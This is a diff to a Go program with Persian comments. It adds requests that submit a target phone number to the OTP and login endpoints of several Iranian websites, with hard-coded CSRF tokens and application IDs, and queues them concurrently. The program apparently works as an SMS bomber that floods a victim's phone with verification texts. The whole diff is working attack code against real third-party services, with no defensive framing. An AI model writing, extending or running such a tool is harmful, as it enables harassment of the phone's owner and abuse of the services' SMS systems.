@@ -243,6 +243,43 @@ func main() {
               
 
 
+
+// 2. itmall.ir (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "digits_check_mob")
+			formData.Set("countrycode", "+98")
+			formData.Set("mobileNo", phone) // استفاده از متغیر phone
+			formData.Set("csrf", "e57d035242") // ممکن است نیاز به تولید دینامیک داشته باشد
+			formData.Set("login", "2")
+			formData.Set("username", "") // طبق payload شما
+			formData.Set("email", "")   // طبق payload شما
+			formData.Set("captcha", "") // طبق payload شما
+			formData.Set("captcha_ses", "") // طبق payload شما
+			formData.Set("json", "1")
+			formData.Set("whatsapp", "0")
+			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// 3. api.mootanroo.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
+				"PhoneNumber": phone, // استفاده از متغیر phone
+			}, &wg, ch)
+		}
+
+		// 4. accounts.khanoumi.com (Form) - ساختار payload شبیه Form Data است
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e") // ممکن است نیاز به تولید دینامیک داشته باشد
+			formData.Set("loginIdentifier", phone) // استفاده از متغیر phone
+			formData.Set("loginSchemeName", "sms")
+			sendFormRequest(ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
+		}
+
 // virgool.io (JSON) - این payload عجیب است، احتمالاً باید JSON باشد اما کلید مالفورم است
 		// فرض میکنیم منظور {"method": "phone", "identifier": phone} بوده
 		wg.Add(1)
